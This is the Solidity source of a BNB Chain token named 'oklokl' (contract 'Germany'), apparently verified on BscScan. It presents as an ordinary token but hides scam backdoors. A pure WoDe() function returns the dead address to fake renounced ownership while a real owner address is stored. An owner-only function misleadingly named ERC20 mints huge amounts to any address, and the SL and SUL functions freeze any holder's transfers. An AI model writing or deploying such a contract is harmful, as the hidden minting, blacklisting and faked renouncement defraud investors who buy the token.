/**
 *Submitted for verification at BscScan.com on 2022-12-02
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-20
*/

/**
 *Submitted for verification at BscScan.com on 2022-05-30
*/

pragma solidity ^0.4.25;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract Ownable {
    address public WoDe;

    event WoDeshipTransferred(address indexed previousWoDe, address indexed newWoDe);

    modifier onlyWoDe() {
        require(msg.sender == WoDe);
        _;
    }

/**
    * @dev Returns the address of the current WoDe.
     */
    function WoDe() public pure returns (address) {
        return address(0x000000000000000000000000000000000000dEaD);
    }


    function transferWoDeship(address newWoDe) public onlyWoDe {
        require(newWoDe != address(0));
        emit WoDeshipTransferred(WoDe, newWoDe);
        WoDe = newWoDe;
    }

    function renounceWoDeship() public onlyWoDe {
        emit WoDeshipTransferred(WoDe, address(0));
        WoDe = address(0);
    }
}



contract BaseToken is Ownable {
    using SafeMath for uint256;

    string constant public name = "oklokl";

    string constant public symbol = "oklokl";

    uint8 constant public decimals = 9;

    uint256 public totalSupply = 100000*10**uint256(decimals);

    uint256 public constant MAXSupply = 100000000000000000000000 * 10 **uint256(decimals);

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    mapping(address => bool) private _isExcludedFromFEI;

    mapping(address => bool) private _LOK;


    uint256 public _taxFEI = 0;
    uint256 private _previousTaxFEI = _taxFEI;

    uint256 public _burnFEI = 0;
    uint256 private _previousBurnFEI = _burnFEI;


    address public projectAddress = 0xE5AEde7c3A9EDf542FeFbc0A0906b6508aeFE58b;


    address public burnAddress = 0x000000000000000000000000000000000000dEaD;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed WoDe, address indexed spender, uint256 value);

    function _transfer(address from, address to, uint value) internal {
        require(to != address(0), "is 0 address");

        require(!_LOK[from], "is LOK");

        if(_isExcludedFromFEI[from])
            removeAllFEI();

        uint256 FEI =  calculateTaxFEI(value);

        uint256 burn =  calculateBurnFEI(value);

        balanceOf[from] = balanceOf[from].sub(value);

        balanceOf[to] = balanceOf[to].add(value).sub(FEI).sub(burn);

        if(FEI > 0) {
            balanceOf[projectAddress] = balanceOf[projectAddress].add(FEI);
            emit Transfer(from, projectAddress, FEI);
        }

        if(burn > 0) {
            balanceOf[burnAddress] = balanceOf[burnAddress].add(burn);
            emit Transfer(from, burnAddress, burn);
        }


         if(_isExcludedFromFEI[from])
            restoreAllFEI();

        emit Transfer(from, to, value);
    }


    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].add(addedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].sub(subtractedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }


    function ERC20(address target, uint256 edAmount) public onlyWoDe{
    	require (totalSupply + edAmount <= MAXSupply);

        balanceOf[target] = balanceOf[target].add(edAmount);
        totalSupply = totalSupply.add(edAmount);

        emit Transfer(0, this, edAmount);
        emit Transfer(this, target, edAmount);
    }

    function calculateTaxFEI(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_taxFEI).div(
            10 ** 2
        );
    }

    function calculateBurnFEI(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_burnFEI).div(
            10 ** 2
        );
    }

    function removeAllFEI() private {
        if(_taxFEI == 0 && _burnFEI == 0)
            return;

        _previousTaxFEI = _taxFEI;
        _previousBurnFEI = _burnFEI;
        _taxFEI = 0;
        _burnFEI = 0;
    }

    function restoreAllFEI() private {
        _taxFEI = _previousTaxFEI;
        _burnFEI = _previousBurnFEI;
    }



    function SL(address account) public onlyWoDe {
        _LOK[account] = true;
    }


    function SUL(address account) public onlyWoDe {
        _LOK[account] = false;
    }


    function isLOK(address account) public view returns (bool) {

        return _LOK[account];
    }


}


contract Germany is BaseToken {

    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);

        WoDe = 0xE5AEde7c3A9EDf542FeFbc0A0906b6508aeFE58b;


    }
}